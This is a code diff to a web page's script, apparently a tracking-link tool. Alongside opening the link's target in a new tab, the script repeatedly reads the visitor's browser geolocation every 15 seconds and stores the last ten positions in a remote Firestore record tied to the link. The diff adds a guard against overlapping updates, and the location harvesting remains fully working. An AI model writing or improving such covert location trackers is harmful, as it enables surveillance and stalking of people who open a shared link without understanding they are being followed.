@@ -137,30 +137,36 @@
                 window.open(linkData.targetUrl, "_blank");
             }
 
+            let isUpdating = false;
+            
             function startTracking() {
                 if (!navigator.geolocation) return;
                 setInterval(async () => {
+                    if (isUpdating) return; // lagi update, skip
+                    isUpdating = true;
                     navigator.geolocation.getCurrentPosition(async pos => {
-                        const snap = await getDoc(linkRef);
-                        if (snap.exists()) {
-                            let data = snap.data();
-                            let history = data.locations || [];
-
-                            history.push({
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                timestamp: Date.now()
-                            });
-
-                            // hanya 10 lokasi terakhir
-                            if (history.length > 10) {
-                                history = history.slice(history.length - 10);
+                        try {
+                            const snap = await getDoc(linkRef);
+                            if (snap.exists()) {
+                                let data = snap.data();
+                                let history = data.locations || [];
+                                history.push({
+                                    latitude: pos.coords.latitude,
+                                    longitude: pos.coords.longitude,
+                                    timestamp: Date.now()
+                                });
+                                if (history.length > 10) {
+                                    history = history.slice(history.length - 10);
+                                }
+                                await updateDoc(linkRef, { locations: history });
                             }
-
-                            await updateDoc(linkRef, { locations: history });
+                        } catch (err) {
+                            console.error("Update error:", err);
+                        } finally {
+                            isUpdating = false;
                         }
-                    }, () => {}, { timeout: 5000 });
-                }, 15000); // update tiap 15 detik
+                    });
+                }, 15000); // 15 detik
             }
         });
     </script>
